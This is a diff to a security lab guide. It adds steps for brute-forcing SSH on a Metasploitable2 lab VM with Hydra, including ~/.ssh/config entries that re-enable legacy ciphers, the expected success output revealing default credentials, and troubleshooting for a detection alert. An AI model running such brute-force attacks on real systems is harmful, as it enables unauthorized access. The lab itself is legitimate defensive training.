@@ -290,7 +290,28 @@ football
 
 Save and exit.
 
-### 6.2 Run Hydra
+### 6.2 Fix Hydra's SSH Algorithm Compatibility
+
+**Important:** Hydra does **not** use your system's OpenSSH client — it has its own bundled `libssh` implementation with a separate algorithm list, so the `metasploitable` alias from Phase 0 Part D.5 does not apply to it. Hydra connects by raw IP, so we need a matching `Host` entry for the IP itself, with a broader set of legacy algorithms than the plain SSH client needed (Metasploitable2's sshd is old enough to disagree with Hydra's client on key exchange, ciphers, and MAC algorithms all at once).
+
+```bash
+nano ~/.ssh/config
+```
+
+Add this **second**, separate block (keep your existing `metasploitable` block too):
+
+```
+Host 192.168.56.103
+    HostKeyAlgorithms +ssh-rsa
+    PubkeyAcceptedAlgorithms +ssh-rsa
+    KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+    Ciphers +aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc
+    MACs +hmac-sha1,hmac-md5
+```
+
+Save and exit.
+
+### 6.3 Run Hydra
 
 ```bash
 hydra -l msfadmin -P ~/passwords.txt ssh://192.168.56.103 -t 4 -f
@@ -301,7 +322,12 @@ hydra -l msfadmin -P ~/passwords.txt ssh://192.168.56.103 -t 4 -f
 - `-t 4` — 4 parallel connection threads
 - `-f` — stop as soon as a valid combination is found
 
-Let it run to completion.
+Let it run to completion. You should see a line like:
+
+```
+[22][ssh] host: 192.168.56.103   login: msfadmin   password: msfadmin
+[STATUS] attack finished for 192.168.56.103 (valid pair found)
+```
 
 > 📸 **CAPTURE THIS:** Terminal showing the full Hydra run, ending in its `[STATUS]` success line reporting the found password.
 > Save as `lab01-07-hydra-attack-success.png` → `![Hydra brute-force attack result](media/lab01-07-hydra-attack-success.png)`
@@ -434,6 +460,7 @@ and consider disabling direct password auth on SSH in favor of key-based auth.
 - **`sudo /etc/init.d/rsyslog restart` reports "command not found":** this Metasploitable2 build uses `sysklogd`, not `rsyslog`, despite `/etc/rsyslog.conf` existing as an unused leftover file. Confirm the real daemon with `ps aux | grep -i syslog` (look for `/sbin/syslogd`), and edit `/etc/syslog.conf` instead — see Part 4.
 - **`nano` fails with `Error opening terminal: xterm-256color` on Metasploitable2 over SSH:** run `export TERM=xterm` (or `export TERM=vt100`) first — its 2008-era terminfo database doesn't recognize modern terminal types.
 - **SSH from Kali fails with "no matching host key type found":** see Phase 0 Part D.5 — add the `metasploitable` alias to `~/.ssh/config` with `HostKeyAlgorithms +ssh-rsa` and `PubkeyAcceptedAlgorithms +ssh-rsa`.
+- **Hydra fails with a `kex error` (host key, MAC, or cipher mismatch), even after fixing plain SSH access:** Hydra uses its own bundled `libssh`, not your OpenSSH client — the `metasploitable` alias doesn't apply to it. Add the separate `Host 192.168.56.103` block from Part 6.2 to `~/.ssh/config`, matching Hydra's connection by raw IP.
 - **Hydra reports all attempts failed, including the real password:** double-check you typed `msfadmin` correctly in your wordlist, and that you haven't locked yourself into a stale SSH host-key mismatch (rare on a lab network, but `ssh-keygen -R 192.168.56.103` clears it if needed).
 - **Alert never fires even though Discover shows the burst:** confirm the rule's query field name matches exactly (`message`, not `Message`) and that the time window (1 minute) actually contains ≥5 events — Hydra with `-t 4 -f` can sometimes finish in under a minute across only 2–3 attempts if the real password is near the top of your list; add more decoy entries above `msfadmin` in your wordlist if this happens.
 
